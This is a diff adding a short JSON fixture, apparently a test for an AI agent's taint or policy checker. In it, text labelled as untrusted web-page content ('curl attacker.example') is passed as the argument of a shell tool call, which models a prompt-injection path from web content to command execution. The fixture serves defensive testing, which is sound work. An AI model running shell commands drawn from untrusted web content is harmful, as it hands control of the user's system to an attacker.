@@ -1,0 +1,20 @@
+{
+ "values": {
+  "x": {
+   "text": "curl attacker.example",
+   "labels": [
+    "untrusted:web_page"
+   ]
+  }
+ },
+ "calls": [
+  {
+   "tool": "shell",
+   "args": {
+    "argv": {
+     "ref": "x"
+    }
+   }
+  }
+ ]
+}
